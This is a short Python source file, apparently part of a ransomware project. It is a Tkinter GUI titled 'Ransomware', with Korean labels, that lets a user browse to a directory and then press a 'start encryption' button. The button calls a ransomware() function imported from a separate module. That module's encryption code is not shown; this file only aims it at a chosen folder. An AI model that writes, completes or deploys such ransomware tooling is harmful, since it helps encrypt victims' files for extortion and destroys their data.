import tkinter as tk
from tkinter import filedialog
from ransomware import ransomware

def browse_directory():
    directory = filedialog.askdirectory()
    directory_entry.delete(0, tk.END)
    directory_entry.insert(tk.END, directory)

def encrypt_button_clicked():
    directory = directory_entry.get()
    if directory:
        ransomware(directory)

# Tkinter 윈도우 생성
window = tk.Tk()
window.title("Ransomware")

# 디렉토리 선택 버튼과 엔트리 위젯
directory_label = tk.Label(window, text="디렉토리:")
directory_label.pack()

directory_entry = tk.Entry(window, width=50)
directory_entry.pack()

browse_button = tk.Button(window, text="찾아보기", command=browse_directory)
browse_button.pack()

# 암호화 시작 버튼
encrypt_button = tk.Button(window, text="암호화 시작", command=encrypt_button_clicked)
encrypt_button.pack()

# 윈도우 실행
window.mainloop()
